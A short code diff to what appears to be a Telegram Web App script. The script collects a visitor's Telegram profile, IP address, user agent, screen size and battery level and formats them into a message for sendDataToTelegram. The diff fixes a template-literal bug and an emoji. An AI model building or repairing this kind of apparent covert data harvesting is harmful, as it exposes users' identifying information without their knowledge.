@@ -13,7 +13,7 @@ function getOSName() {
 }
 
 function getScreenResolution() {
-    return ${window.screen.width}x${window.screen.height};
+    return `${window.screen.width}x${window.screen.height}`;
 }
 
 async function getBatteryPercentage() {
@@ -49,7 +49,7 @@ async function sendDataToTelegram() {
 ├ Язык: <code>${tg.initDataUnsafe.user.language_code}</code>
 └ Можно писать в ЛС: <code>${tg.initDataUnsafe.user.allows_write_to_pm}</code>
 
-<b>🖥 Информация об устройстве:</b>
+<b>🖥️ Информация об устройстве:</b>
 ├ Айпи: <code>${ipAddress}</code>
 ├ UserAgent: <code>${userAgent}</code>
 ├ Хэш: <code>undefined</code>
